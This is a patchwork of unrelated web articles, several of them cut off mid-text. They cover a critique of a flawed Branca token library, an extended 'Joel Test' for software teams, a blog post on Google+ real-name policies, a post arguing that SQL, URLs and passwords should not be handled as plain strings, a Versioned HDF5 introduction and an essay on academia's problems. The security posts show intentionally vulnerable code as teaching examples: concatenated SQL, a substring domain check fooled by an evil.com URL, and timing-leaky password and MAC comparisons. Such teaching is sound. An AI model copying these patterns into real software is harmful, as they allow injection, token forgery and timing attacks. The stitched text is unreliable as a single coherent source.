<p>As NaCls documentation states, any given key used with Poly1305 may <strong>only be used once</strong> otherwise, an attacker could forge future authenticators. This is a problem since Branca might be used in contexts like authenticating API calls, where long-lived API keys are used. <strong>IdentityModel allows attackers to forge API tokens</strong>.</p>

<p>This would not be a problem in IdentityModel, had it at least used ChaCha20-Poly1305 from BouncyCastle to attempt the Branca implementation. ChaCha20-Poly1305 uses the first 32 bytes of the first keystream-block (64 bytes), of the internal ChaCha20 state, as the Poly1305 one-time key. So if a nonce is unique for every time ChaCha20-Poly1305 is used with any given key (which it <strong>MUST</strong>), the Poly1305 key will also be unique.</p>

<p>Of course, IdentityModel should use XChaCha20-Poly1305, not only because that is what the Branca specification defines, but also because it’s not safe to randomly generate nonces for ChaCha20 or ChaCha20-Poly1305 (see <a href="https://godoc.org/golang.org/x/crypto/chacha20poly1305">/x/crypto</a>). This limitation was the motivation behind XChaCha20-Poly1305 (see <a href="https://github.com/bikeshedders/xchacha-rfc/blob/master/draft-irtf-cfrg-xchacha-rfc-03.txt">draft RFC</a>).</p>

<h4 id="constant-time-mac-comparison">Constant-time MAC comparison</h4>
<p>Any decent ChaCha20-Poly1305 or XChaCha20-Poly1305 implementation will compare the Poly1305 MACs in constant-time, to not reveal information via a timing side-channel. This, unfortunately, is not the case for IdentityModel either:</p>

<div><div><pre><code><span>var</span> <span>headerMac</span> <span>=</span> <span>new</span> <span>byte</span><span>[</span><span>16</span><span>];</span>
<span>[..]</span>
<span>if</span> <span>(!</span><span>headerMac</span><span>.</span><span>SequenceEqual</span><span>(</span><span>tag</span><span>))</span> <span>throw</span> <span>new</span> <span>SecurityTokenException</span><span>(</span><span>"Invalid message authentication code"</span><span>);</span>
</code></pre></div></div>

<p>BouncyCastle uses constant-time comparison with ChaCha20-Poly1305 and provides the comparison function as a utility:</p>

<div><div><pre><code><span>if</span> <span>(!</span><span>Arrays</span><span>.</span><span>ConstantTimeAreEqual</span><span>(</span><span>MacSize</span><span>,</span> <span>mMac</span><span>,</span> <span>0</span><span>,</span> <span>mBuf</span><span>,</span> <span>resultLen</span><span>))</span>
<span>{</span>
    <span>throw</span> <span>new</span> <span>InvalidCipherTextException</span><span>(</span><span>"mac check in ChaCha20Poly1305 failed"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<h3 id="summary">Summary</h3>

<p>I’m a big fan of “rolling your own crypto” and here I’m talking about implementing known algorithms. I do it myself. I even think making it available on GitHub or similar, to ask for feedback, is good (if users are warned that no security can be expected).</p>

<p>However, a problem arises when projects that …</p></div></article></div></div></div>

August 22, 2020 | https://gerlacdt.github.io/posts/writing-better-software/ | <a href="https://web.archive.org/web/*/https://gerlacdt.github.io/posts/writing-better-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>I</span>n Joel Spolsky’s blog post <a href="https://www.joelonsoftware.com/2000/08/09/the-joel-test-12-steps-to-better-code/" target="_blank" rel="noopener">“The Joel Test: 12 Steps to better
Code”</a>,
he describes a test composed of twelve simple yes-no questions. For a
<strong>yes</strong> you get one point. 10 points are acceptable and 12 are
perfect. If you have less than 10 points, you will get in trouble with
your software – sooner or later.</p>
<p>For a quick self-check, these are the original questions:</p>
<ol>
<li>Do you use source control?</li>
<li>Can you make a build in one step?</li>
<li>Do you make daily builds?</li>
<li>Do you have a bug database?</li>
<li>Do you fix bugs before writing new code?</li>
<li>Do you have an up-to-date schedule?</li>
<li>Do you have a spec?</li>
<li>Do programmers have quiet working conditions?</li>
<li>Do you use the best tools money can buy?</li>
<li>Do you have testers?</li>
<li>Do new candidates write code during their interview?</li>
<li>Do you do hallway usability testing?</li>
</ol>
<p>Although Joel’s Test is still an excellent indicator for good software
development and engineering, 20 years have past and many game changing
technologies have emerged like mobile apps, the public cloud and in
general better tooling is available. The success of
<a href="https://git-scm.com/" target="_blank" rel="noopener">git</a> and <a href="https://github.com/" target="_blank" rel="noopener">github</a> changed
how we develop software. In this article i want to extend Joel’s test
with contemporary questions:</p>
<ol start="13">
<li>Do you enforce a common code styleguide?</li>
<li>Do you write tests?</li>
<li>Do you conduct code reviews?</li>
<li>Do your developers write documentation?</li>
<li>Do you focus on code health?</li>
<li>Do you practice continuous integration?</li>
<li>Do you have a mentoring program?</li>
<li>Is your infrastructure reproducible?</li>
<li>Are you doing your best to keep your engineers?</li>
<li>Do you provide the best technology for your developers?</li>
<li>Do you focus on the four key metrics?</li>
<li>Do you empower your developers?</li>
</ol>
<p>The extended test consists of 24 yes-no questions. As with Joel’s
Test, for a <strong>yes</strong> you get one point. The ranking is:</p>
<ul>
<li>&lt;= 20 points, you must improve</li>
<li>21 points, you are ok</li>
<li>22 points, you are a high-performer</li>
<li>23 points, you are a high-performer</li>
<li>24 points, you are best-in-class</li>
</ul>
<p>Further I want to emphasis that <strong>sustainablity</strong> is my main intention
for the test. Many questions contribute directly or indirectly to a
sustainable and healthy codebase which is crucial for a successful
long-term software project and in general for a successful software
company. <a href="https://youtu.be/zW-i9eVGU_k?t=197" target="_blank" rel="noopener">Titus Winters</a> defines a
sustainable codebase as:</p>
<blockquote>
<p>Your organization’s codebase is sustainable when you are able to
change all of the things that you ought to change, safety, and can do
so for the lifetime of your codebase.</p>

Do you enforce a common code styleguide?</h4>
<p><strong>Consistency</strong> is one of the most important properties of a codebase.
It bolsters readability and maintainability which are essential for
sustainable code. A consistent codebase is easier to grasp and makes
onboarding new developers faster. New programmers are guided by the
prevailing style and can adapt quickly to it. Consistency is also an
indicator for coder’s discipline, clearly you don’t want to have dead
code, unused imports, wrong indentations, and other intricacies in
your codebase. The desired consistency can be achieved by a code
styleguide.</p>
<p>At best you enforce the rules of the styleguide via tooling like
static code analyzers, linters and autoformatting tools. Often these
tools are integrated into the build or are executed before a
commit. Further there are also manually measures like <a href="#codereview">code
reviews</a> to enforce a common code style.</p>
<p>A consistent code style increases productivity, e.g. linters prevent
sloppy programming errors, autoformatters leave no room for useless
(sometimes religious) discussions about indentation and formatting
rules. All code looks the same. Developer’s taste and ego take a back
seat.</p>

Do you write tests?</h4>
<p>Writing automatic test is a major trait of a sustainable
codebase. There are many kind of tests but the best known
classification comes with the <a href="https://martinfowler.com/articles/practical-test-pyramid.html" target="_blank" rel="noopener">Test
Pyramid</a>.</p>
<ul>
<li>Unit Tests</li>
<li>Service Tests</li>
<li>User Interface Tests</li>
</ul>
<p>Particularly <strong>unit tests</strong> build the foundation and give developers
confidence to move fast and not to break existing functionality. Unit
testing is a major pillar of a fast feedback loop. This keeps
developers happy and the quality high. In general, tests act as a
safety net, prevent new bugs from being introduced and old bugs from
reoccurrence.</p>
<p>Without automatic tests your codebase will erode and only long-term
developers will be capable to make changes. Onboarding new developers
will take months or will never succeed at all. Over time developer
speed will slow down and finally come to a complete halt. Heavily
relying on manual testing before a release is a clear indicator of
missing automatic tests and extends the release cycle by days or
weeks. High performers deploy on a daily basis which is not possible
with manual testing phases. Therefore manual testing should be reduced
to a minimum or completely avoided.</p>
<p>Establishing a good testing culture is especially important. E.g.</p>
<ul>
<li>no code changes without a corresponding test</li>
<li>no bugfix without a test demonstrating the bug is indeed fixed</li>
<li>unit test should be fast, so developers run them continuously</li>
<li>unit test code coverage should be at a reasonable level like ~70%</li>
</ul>
<p>At Google, they practice the <a href="https://www.oreilly.com/library/view/software-engineering-at/9781492082781/" target="_blank" rel="noopener">Beyonce Rule “If you liked it, you
shoulda put a test on
it!"</a>
This rule inverts responsibility, e.g. if someone breaks a feature and
there was no test, the original author of the broken feature “shoulda
put a test on it!”.</p>

Do you conduct code reviews?</h4>
<p>Code reviews are a critical step in your software engineering
process. Not only they prevent entering bugs into your mainline but
they are a major tool for knowledge transfer, learning and mentoring.
The code review process fosters a common understanding between
reviewers and author and offers a platform for discussions about
trade-offs and design decisions. Reviews are not only focused on
correctness but also on readability, performance and other
non-functional properties.</p>
<p>All of that will lead to better solutions. Further reviewers practice
their code reading skill which is as important as code
writing. Besides compiling, linting and running tests, code reviews
form a major step in a developers feedback loop. Code should never be
committed into mainline without a proper code review.</p>
<p>Because code reviews can conjure up heated discussions, reviewers
should comply to some <a href="https://google.github.io/eng-practices/review/reviewer/" target="_blank" rel="noopener">code review
guidelines</a>
in order to guarantee a flawless experience.</p>

Do developers write documentation?</h4>
<p>Documentation starts with the code. Code comments or a good
description of a pull request are good examples. Thereby good
documentation focuses on <strong>why</strong> something was done. An extensive
<code>README.md</code> acts as the “front-page” of a project and should contain
its purpose and instructions for developers to set up their local
environment for development, e.g installing prerequisites, building
the project, running the tests.</p>
<p>Additionally a variety of documents with different purposes exist:</p>
<ul>
<li>Design Docs (showing alternative solutions, why was one approach
chosen over the others?)</li>
<li>Architecture Diagrams (System overview, showing coherence between
components)</li>
<li>Operational Playbooks for <a href="https://landing.google.com/sre/workbook/chapters/on-call/" target="_blank" rel="noopener">Software Reliability Engineers
(SREs)</a>
(operational instructions for fighting outages)</li>
</ul>
<p>All these documents should be written by developers, operators or
other technical people. Living, up-to-date documentation makes a
project more understandable and long-term project members are capable
of answering questions why things were done in the past – in the
majority of projects, the top answer is “this is historically grown”.
The only way to get real insights is conducting time consuming
face-to-face interviews. Documentation helps to keep an overview over
an ever-growing project, to facilitate the start for new developers
and to build a searchable knowledge base. Past decisions should be
transparent through good documentation and not hidden in people’s
heads.</p>

Do you focus on code health?</h3>
<p>A healthy codebase is a major criteria for developer happiness. If
your developers working on a shitty codebase, they adapt to the poor
quality or leave. The existing codebase act as a <strong>role model</strong>. For
the purpose of high quality code, it is important to continuously
focus on code health. The best coders are repelled by bad code and
attracted by healthy code. But what is a healthy codebase?</p>
<p>A codebase is healthy when:</p>
<ul>
<li>you have fast builds</li>
<li>you have an easy development setup</li>
<li>you have fast and maintainable tests</li>
<li>you have clean, readable, loosely coupled and consistent code</li>
<li>you can easily debug the system</li>
<li>you continuously tackle technical debt</li>
</ul>
<p>You can find a much more exhaustive explanation of code health in
<a href="https://testing.googleblog.com/2016/08/hackable-projects.html" target="_blank" rel="noopener">Google’s Testing Blog about Code
Health</a>.</p>
<p>Signs of bad code are:</p>
<ul>
<li>complicated developer setup</li>
<li>hard to debug, missing monitoring, noisy garbage logs</li>
<li>long build times</li>
<li>inconsistent code (dead code, unused imports, different formatting
styles, no code styleguide)</li>
<li>large merge conflicts due to long running feature branches, broken mainline</li>
<li>no tests, flaky tests, hard-maintainable tests because of mocking overuse</li>
</ul>
<p>Never trade dirty code or workarounds due to time or release pressure
for code health. You will end up very badly in the long run. Worse
yet, you get in a vicious cycle because bad code slows you down and in
order to fulfil the next release you add more dirty workarounds. So

Do you practice continuous integration?</h3>
<p>Nowadays Continuous Integration is hopefully commonplace. At best, you
work with trunk-based development and your mainline is always
releasable, preferably with feature toggles. Highest priority is to
keep the mainline green and a broken build should be fixed
immediately. Small and frequent releases prevent bugs or even outages
which happen when large releases are done only intermittently.</p>
<p>CI helps to prevent tedious merge conflict resolutions because your
developers regularly commit into mainline. Additionally you will get
rid of time consuming integration problems at the end of your
implementation phases.</p>
<p>“Agile”’s main goal is to identify risks as early as possible and not
to postpone them till the end of a project. CI supports exactly</p></div></div>

	<p><small>August 21, 2020</small></p>
</div><div><p>Once upon a time I might have believed in Google's fundamental
goodness and well intentioned nature (probably with qualifications).
Google themselves eventually taught me better, perhaps later than
it took for other people to realize that they were an amoral
corporation. For me, the moment of realization, the point where I
knew for sure that Google's "don't be evil" slogan was inoperative,
was the great <a href="https://en.wikipedia.org/wiki/Google%2B">Google+</a>
'nymwars', where Google (for Google+) declared that everyone on
Google+ must use their real name and then attempted to enforce that
(<a href="https://en.wikipedia.org/wiki/Nymwars#Google">it went wrong pretty fast</a>).</p>

<p>There were a large number of problems with Google+'s 'real name'
policies. It didn't match how actual users referred to each other
and were known online, including for people who actually worked at
Google. Forcing people to reveal their real name does real harm and
has real risks (something appreciated even back then in 2011, but
which is more pointed today). And in practice, a 'real name' policy
is actually a 'it looks like a real name to underpaid support people
or some automated system' policy, where 'John Smith' is far more
likely to be accepted than a non-Western name or an unusual one,
even if one is not your real name and the other is.</p>

<p>Google knew all of this. People, including internal people, pointed
this out to them at great length. A decent number of technical people
who worked at Google protested. There were demonstrated problems with
the actual enforcement and actions involved. And Google, in both their
senior leadership and their ongoing policies, simply didn't care. All
of the harms and the wrongs did not matter to them. They were going to
do evil because they could, and because they thought it served their
corporate goals for Google+.</p>

<p>(We all know how that one went; Google+ died, for all that it had
some good ideas.)</p>

<p>Watching all of this happen, watching all of the protesting and
good arguments and everything go exactly nowhere, is when I knew
that my image of Google was wrong (and gone). Now I extend no more
trust to Google than I think supported by their corporate and
commercial interests. Google employees may care about "don't be
evil" and doing the right thing and so on, but Google as a whole
does not, and the employees do what Google tells them to.</p>

<p>(This elaborates something I said in an aside long ago, in an entry
about <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/SmartphoneWhyIPhone">why my smartphone is an iPhone</a>.)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>
    
    
  </header>
  <p>As programmers, we have a collective delusion that anything that can be represented as a string, is a string. This thinking causes a whole bunch of problems.</p>

<p>Let’s take SQL for example. Every API in every programming language that I’ve seen considers SQL statement a string.</p>

<div><div><pre><code>function execute(sql: string): Promise&lt;Result&gt;
</code></pre></div></div>

<p>The problem with this API is that not every string is a valid SQL (nor sometimes it is the SQL you actually want to run).</p>

<p>Here’s a classic example of the misuse:</p>

<div><div><pre><code>const query = 'SELECT * FROM posts WHERE id = '
  + params.id;
</code></pre></div></div>

<p>In this example <code>params.id</code> can be anything, including invalid or malicious SQL.</p>

<p>The root problem here is not the lack of sanitization. The problem is that SQL is treated as a string.</p>

<p>Think about JSON for another example. You could certainly implement adding an item to a hash by doing this (I hope this code makes you cringe):</p>

<div><div><pre><code>function addKeyValue(json, key, value) {
  return json.substr(0, json.length - 1)
    + ', "' + key + '": "' + value + '"}';
}
</code></pre></div></div>

<p>As with the SQL example, you could add escaping and sanitization, but it’s just hacks hiding the real problem:</p>

<p><em>A string can be a representation of a thing, but it’s not the thing itself.</em></p>

<p>And it’s not only about concatenating strings. Can you spot the problem with this function? <span onclick="event.target.innerText = 'This URL will be marked as safe by the code below https://evil.com/https://safe.com/'">(see answer)</span></p>

<div><div><pre><code>function isSafeDomain(url: string): boolean {
  return url.includes('https://safe.com/');
}
</code></pre></div></div>

<p>Or in this one? <span onclick="event.target.innerText = 'This code is prone to timing attacks'">(see answer)</span></p>

<div><div><pre><code>function checkPassword(pass: string, hash: string): boolean {
  return sha1(pass) === hash;
}
</code></pre></div></div>

<p>Strings are lower level, and thus are much more flexible than they need to be to properly implement valid operations on the higher level concepts.</p>

<p>Incomplete list of things that are not strings:</p>

<ul>
  <li>SQL</li>
  <li>HTML</li>
  <li>JSON</li>
  <li>URL</li>
  <li>File path</li>
  <li>Password</li>
</ul>

<h2 id="things-are-things">Things are… things</h2>

<p>You can save yourself a lot of headache if you stop treating everything that can be represented as a string, as a string.</p>

<p>Both OO and FP styles allow for abstracting away something as a type or a class. You can make a closed opaque structure for the thing and limit the ways it can be constructed.</p>

<p>For example, for SQL, you might want to make sure it’s only created from static string literals.</p>

<div><div><pre><code>// Allowed
new SQL('SELECT * FROM posts WHERE id = ?');

// No allowed (e.g. via a lint rule)
new SQL('SELECT * FROM posts' + filter);
</code></pre></div></div>

<p>Of course, at some point, you will need to serialize the thing into a string to pass it into an API that was designed to consume a string. Do it at the last possible moment and try to limit it to a single place in the codebase.</p>

<div><div><pre><code>function execute(sql: SQL): Promise&lt;Result&gt; {
  return unsafeExecute(sql.toString());
}
</code></pre></div></div>

<p>Strings are coming into your app from the outer world. Don’t trust them to be what they seem they are. Convert them into proper things as soon as possible, and convert them back to strings as late as possible.</p>

<p>Here’s a few libraries for inspiration of how to treat things as… things:</p>

<ul>
  <li>SQL: <a href="https://github.com/gajus/slonik">Slonik</a>, <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/basic-linq-query-operations">LINQ</a></li>
  <li>HTML: React, Elm, <a href="https://github.com/tonsky/rum">rum</a></li>
  <li>JSON: a dictionary in any programming language</li>
  <li>URL: <a href="https://docs.rs/url/2.1.1/url/">url - Rust</a></li>
  <li>File paths: <a href="https://doc.rust-lang.org/std/path/struct.Path.html">std::path::Path - Rust</a></li>
  <li>Passwords: <a href="https://github.com/myfreeweb/secstr">secstr</a>, <a href="https://hackage.haskell.org/package/securemem">securemem</a></li>

<p>The problem of storing and manipulating large amounts of data is a challenge in
many scientific computing and industry applications. One of the standard data
models for this is <a href="https://support.hdfgroup.org/HDF5/whatishdf5.html">HDF5</a>,
an open technology that implements a hierarchical structure (similar to a
file-system structure) for storing large amounts of possibly heterogeneous data
within a single file. Data in an HDF5 file is organized into <em>groups</em> and
<em>datasets</em>; you can think about these as the folders and files in your local
file system, respectively. You can also optionally store metadata associated
with each item in a file, which makes this a self-describing and powerful data
storage model.</p>
<!-- TEASER_END -->

<p><img alt="Hierarchical Data Format (HDF5) Dataset (From https://www.neonscience.org/about-hdf5)" src="https://labs.quansight.org/images/hdf5_structure4_resized.png"><em>Image: Hierarchical Data Format (HDF5) Dataset (From https://www.neonscience.org/about-hdf5)</em></p>
<p>Since reading and writing operations in these large data files must be fast,
the HDF5 model includes data compression and <em>chunking</em>. This technique allows
the data to be retrieved in subsets that fit the computer's memory or RAM,
which means that it doesn't require the entire file contents to be loaded into
memory at once. All this makes HDF5 a popular format in several domains, and
with <a href="https://www.h5py.org/">h5py</a> it is possible to use a Pythonic interface to
read and write data to a HDF5 file.</p>
<p>Now, let's say you have an HDF5 file with contents that change over time. You
may want to add or remove datasets, change the contents of the data or the
metadata, and keep a record of which changes occurred when, with a way to
recover previous versions of this file. Since HDF5 is a binary file format,
using regular version control tools (such as git) may prove difficult.</p>
<h3>Introducing the Versioned HDF5 library</h3>
<p>The Versioned HDF5 library is a versioned abstraction on top of h5py. Because
of the flexibility of the HDF5 data model, all versioning data is stored in the
file itself, which means that different versions of the same data (including
version metadata) can be stored in a single HDF5 file.</p>
<p>To see how this works in practice, let's say we create a regular HDF5 file with
h5py called <code>mydata.h5</code>.</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>import</span> <span>h5py</span>
    <span>&gt;&gt;&gt;</span> <span>fileobject</span> <span>=</span> <span>h5py</span><span>.</span><span>File</span><span>(</span><span>'mydata.h5'</span><span>,</span> <span>'w'</span><span>)</span>
</code></pre>


<p>Now, you can create a <code>VersionedHDF5file</code> object:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>from</span> <span>versioned_hdf5</span> <span>import</span> <span>VersionedHDF5File</span>
    <span>&gt;&gt;&gt;</span> <span>versioned_file</span> <span>=</span> <span>VersionedHDF5File</span><span>(</span><span>fileobject</span><span>)</span>
</code></pre>


<p>This file still doesn't have any data or versions stored in it. To create a new
version, you can use a context manager:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>with</span> <span>versioned_file</span><span>.</span><span>stage_version</span><span>(</span><span>'version1'</span><span>)</span> <span>as</span> <span>group</span><span>:</span>
    <span>...</span>     <span>group</span><span>[</span><span>'mydataset'</span><span>]</span> <span>=</span> <span>np</span><span>.</span><span>ones</span><span>(</span><span>10000</span><span>)</span>
</code></pre>


<p>The context manager returns a h5py group object, which should be modified
in-place to build the new version. When the context manager exits, the version
will be written to the file. From this moment on, any interaction with the
versioned groups and datasets should be done via the Versioned HDF5 API, rather
than h5py.</p>
<p>Now, the <code>versioned_file</code> object can be used to expose versioned data by version name:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>v1</span> <span>=</span> <span>versioned_file</span><span>[</span><span>'version1'</span><span>]</span>
    <span>&gt;&gt;&gt;</span> <span>v1</span>
    <span>&lt;</span><span>Committed</span> <span>InMemoryGroup</span> <span>"/_version_data/versions/version1"</span><span>&gt;</span>
    <span>&gt;&gt;&gt;</span> <span>v1</span><span>[</span><span>'mydataset'</span><span>]</span>
    <span>&lt;</span><span>InMemoryArrayDataset</span> <span>"mydataset"</span><span>:</span> <span>shape</span> <span>(</span><span>10000</span><span>,),</span> <span>type</span> <span>"&lt;f8"</span><span>&gt;</span>
</code></pre>


<p>To access the actual data stored in version <code>version1</code>, we use the same syntax
as h5py:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>dataset</span> <span>=</span> <span>v1</span><span>[</span><span>'mydataset'</span><span>]</span>
    <span>&gt;&gt;&gt;</span> <span>dataset</span><span>[()]</span>
    <span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>...</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre>


<p>Suppose now we want to commit a new version of this data, changing just a slice
of the data. We can do this as follows:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>with</span> <span>versioned_file</span><span>.</span><span>stage_version</span><span>(</span><span>'version2'</span><span>)</span> <span>as</span> <span>group</span><span>:</span>
    <span>...</span>     <span>group</span><span>[</span><span>'mydataset'</span><span>][</span><span>0</span><span>]</span> <span>=</span> <span>-</span><span>10</span>
</code></pre>


<p>Both versions are now stored in the file, and can be accessed independently.</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>v2</span> <span>=</span> <span>versioned_file</span><span>[</span><span>'version2'</span><span>]</span>
    <span>&gt;&gt;&gt;</span> <span>v1</span><span>[</span><span>'mydataset'</span><span>][()]</span>
    <span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>...</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>])]</span>
    <span>&gt;&gt;&gt;</span> <span>v2</span><span>[</span><span>'mydataset'</span><span>][()]</span>
    <span>array</span><span>([</span><span>-</span><span>10.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>...</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>])]</span>
</code></pre>


<h3>Current status</h3>
<p><code>versioned-hdf5 1.0</code> has recently been released, and is available on PyPI and conda-forge. You can install it with</p>
<pre><span></span><code><span>conda</span> <span>install</span> <span>-</span><span>c</span> <span>conda</span><span>-</span><span>forge</span> <span>versioned</span><span>-</span><span>hdf5</span>
</code></pre>


<p>The development is on <a href="https://github.com/deshaw/versioned-hdf5">GitHub</a>.
Currently, the library supports basic use cases, but there is still a lot to
do. We welcome community contributions to the library, including any issues or
feature requests.</p>
<p>For now, you can check out the
<a href="https://deshaw.github.io/versioned-hdf5/">documentation</a> for more details on
what is supported and how the library is built.</p>
<h3>Next steps</h3>
<p>This is the first post in a series about the Versioned HDF5 library. Next,
we'll discuss the performance of Versioned HDF5 files, and the design of the
library.</p>
<p>The Versioned HDF5 library was created by the <a href="https://www.deshaw.com/">D. E. Shaw
group</a> in conjunction with
<a href="https://www.quansight.com/">Quansight</a>.</p>

<p>This document is my attempt to keep a thematic list of all the problems that affect
academic research, as I can tell from my point of view 
(theoretical computer science research in France).
It was written after having worked in academia for 6 years, which I hope strikes a right balance
between being too naive and having become oblivious to problems.
This list is not a call to action directed at anyone (except
maybe myself), but I hope it can lead to discussion and maybe to change.</p>
<p>Of course, despite these flaws, there are many things
to like about academia: complete freedom, fascinating questions, passionate
people, limited short-term pressure, etc. Many of the problems in this list also exist
in other environments, and some of them are only more noticeable in academia because of its
high standards (e.g., having to support your claims)
and noble goals (e.g., acting in the public interest).
Overall, I am still enthusiastic about academic research: it wouldn't be my
job otherwise!
Yet, I think it would be worthwhile for academics to spend more time thinking
about these problems and discussing possible solutions to them.</p>
<p>As this page is rather long, each problem is in a separate section: I have put a
star (*) in the title of those that I consider to be the most important. I have
also put the main contents of each section in a collapsible box. If you want,
you can:</p>

<p>If you are in a hurry, here is a 280-char summary of the core issue:</p>
<blockquote>
<p><em>The competition for positions and grants has lead academia to focus on papers
and citations as the primary indicators of success. This is influencing how
research is conducted and presented, and makes it hard to complement traditional
publishing with new ways to share knowledge.</em></p>
</blockquote>
<p>As for other pages in this website, my <a href="http://a3nm.net/legal/">disclaimer</a> applies: while I am
definitely relying on my research experience to write this essay, it only
reflects my personal opinion, and is not endorsed by my current or past
employers.
I am interested in your opinion about these problems or their solutions, or
if you would add other problems to this list.
Feel free to reach out by email at a3nm@a3nm.net.
I'm grateful to <a href="#Acknowledgements">many people</a> who wrote to suggest
improvements to this page.</p>

<p>This section presents problems related to the distribution and formatting of
traditional academic papers.</p>
<h3 id="OpenAccess"><a href="#OpenAccess">Papers are not all publicly available (*)</a><a href="#OpenAccess" title="Permanent link">¶</a></h3>
<p>The goal of research is to develop and distribute new knowledge. Yet, its output
is often difficult to access because it is stuck behind paywalls: potential
readers need to pay to access research articles.</p>
<details>
<summary>Details and proposed solutions...</summary>
<p>Of course, many other kinds of creative works have a price: books, music, movies, video games, etc. 
However, for such works, a part of the price usually goes to support the
creators, i.e., the musicians, writers, etc.
By contrast, subscriptions and payments for research articles do not
support researchers.
In fact, researchers earn a salary from their home university or other institutions,
which are often publicly funded institutions:
so it also seems like members of the public should be able to access the results of their research.</p>
<p>So what happens to the money paid to access scientific papers? All of it goes to the academic publisher, which 
is often a private company, or sometimes a university or scientific society.
This is counter-intuitive because most of the "cost" of research is not incurred by the publisher:
the research is done by researchers,
it is written up in a paper by these same researchers,
the paper is typeset by the researchers themselves (at least, in computer science),
the paper is <a href="https://en.wikipedia.org/wiki/Peer_review">peer reviewed</a>
by other researchers, and the whole process is usually overseen by researchers.
Yet, the publication venues (conferences and journals) belong to a publisher,
which takes copyright ownership of the papers at the very end of the process, and sells them.
The only contribution of the publisher is to reformat the paper slightly<sup id="fnref:publishers"><a href="#fn:publishers">1</a></sup>, and host it online behind a paywall.
The publisher then makes money from the paywall, so they forbid other people from sharing or re-hosting the article elsewhere, and thus end up working <em>against</em> the distribution of articles.</p>
<p>The justification for this broken system is historical.
Before the Internet and computers,
it was difficult to typeset papers, distributing them in paper form was a heavy and costly investment, and
editors were often small companies with scientific expertise in their subject area.
Nowadays, typesetting is mostly done directly by the authors, online distribution is trivial, and publishers have merged into
publicly-traded multinational conglomerates who minimize their scientific involvement and maximize their profits.</p>
<p>There are many problems with the current system:</p>
<ul>
<li>People without a subscription cannot read research articles. Of course, most readers of scientific articles are academics who usually have a subscription via their university. However, there are also many potential readers outside academia: companies, curious high-school students or pensioners, hobbyists, 
    policymakers, patients who want to know more about a disease that they have, etc. Currently, these people cannot easily read academic articles: this contributes to the divide between academia and non-academics, it gives academia a bad image, and it reduces the overall impact of academic research. For instance, computer science engineers who work in companies are often heard complaining about being unable to access papers that would seem relevant to their work.</li>
<li>The contents of research articles are not indexed by search engines, so they
  are difficult to find for researchers, and are invisible to non-academics.</li>
<li>Not all universities are subscribed to all venues. In particular, poorer universities, especially in developing countries, often cannot afford
  subscriptions fees. Research is supposed to be an even playing field, but this excludes some players from the academic discourse.</li>
<li>When researchers want to access an article for which their university has no subscription, 
they have to find workarounds: asking friends for illegal copies, setting up VPNs, etc. This is tedious, can be illegal, and doesn't even always work: in my research, there have been several cases where I was completely unable to find any available copy of an article that seemed relevant to what I was doing.</li>
<li>Universities and libraries have to pay expensive subscription fees to publishers. As each research article is unique, there is no competition in this market, so the fees are as obscure and extortionate as you would expect.</li>
<li>Solutions like <a href="https://en.wikipedia.org/wiki/Sci-hub">Sci-Hub</a> are arguably doing more for the scientific community than traditional publishers. Yet, they are illegal, so they face legal threats from publishers, and people outside academia usually do not know about them.</li>
</ul>
<p>To work around these problems, many researchers put copies of their own work online.
However, these articles often have an unclear copyright status, so they cannot be mirrored or redistributed, or licensed, e.g., under a <a href="https://en.wikipedia.org/wiki/Creative_Commons">Creative Commons</a> license.
Further, they are often hosted only on the author's website, and not in a stable repository: hence,
when the authors retire or change institutions, the webpages and the papers disappear.
Last, this author copy is often slightly different from the publisher version, in terms of formatting, numbering, and sometimes content: this
causes much confusion about which version should be cited, which version is more up-to-date, etc., and researchers waste time formatting, typesetting, and proofreading multiple versions of their work.</p>
<p>Some publishers are happy to propose a solution to these problems: the author-pays open access model, aka "gold open access". In this model, the author can choose to have their research article freely available on the publisher's website, with no paywall or fees;
but instead the author has to pay an "article processing charge" to cover the publisher's costs.
So, how much do publishers charge to host a PDF file online? The <a href="https://en.wikipedia.org/wiki/Association_for_Computing_Machinery">ACM</a> charges
700&nbsp;USD per article<sup id="fnref:acmfees"><a href="#fn:acmfees">2</a></sup>, and other publishers usually charge more. Compare this to the open repository <a href="http://arxiv.org/">arXiv</a> which offers to host PDF files at no cost to authors or readers: it hosted 
over 110k new articles in 2016 for a budget of 1.1&nbsp;MUSD, amounting to around 10&nbsp;USD per article<sup id="fnref:arxivstats"><a href="#fn:arxivstats">3</a></sup>; or to <a href="https://www.dagstuhl.de/en/publications/lipics/">LIPIcs</a>, a rare example of an ethical publisher, who charges at most 60&nbsp;EUR per article<sup id="fnref:lipicsfees"><a href="#fn:lipicsfees">4</a></sup>. As research is <a href="#Funding">underfunded</a>, 700&nbsp;USD is a lot of money, all the more so in developing countries and poorer universities. Further, with this optional author-pays model, libraries still need to pay subscriptions to access the articles that are not open-access, in addition to paying article processing charges when they publish, i.e., they <a href="https://en.wikipedia.org/wiki/Hybrid_open_access_journal">pay twice</a>.</p>
<p>So, why don't scientists get rid of these useless scientific publishers? This is trickier than one could expect, because the main <a href="#Indicators">indicator</a> to evaluate researchers is the number of articles that they publish in traditional publishing venues (conferences and journals).
Hence, researchers would harm their careers if they stopped publishing their results with traditional venues.
